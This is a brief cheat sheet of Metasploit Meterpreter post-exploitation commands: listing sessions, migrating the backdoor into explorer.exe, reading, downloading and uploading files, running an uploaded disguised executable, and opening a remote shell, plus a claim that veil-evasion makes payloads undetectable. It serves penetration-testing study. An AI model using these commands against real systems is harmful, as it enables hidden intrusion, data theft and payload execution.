# Post Exploitation

* Assuming that one already has access to the target computer through Metasploit, we can run multiple commands on Meterpreter:

```shell
#inside meterpreter session currently

help #shows help manual

background #backgrounds current session

sessions -l #lists all current sessions

sessions -i 4 #to interact with particular session

sysinfo #shows info about target computer

ipconfig #shows all interfaces connected to target computer

ps #shows all running processes

migrate 4376 #migrates meterpreter from current PID (backdoor) to new PID (e.g. - explorer.exe)

pwd #get current working directory

ls #list all files and directories

#cd can be used to switch directories

cat test.txt #read contents of file

download test.txt #download file

upload car-image.exe #upload file

execute -f car-image.exe #execute file

shell #opens Windows Shell to run Windows commands
```

* Using metasploit and veil-evasion together is proven to be more robust and undetectable.
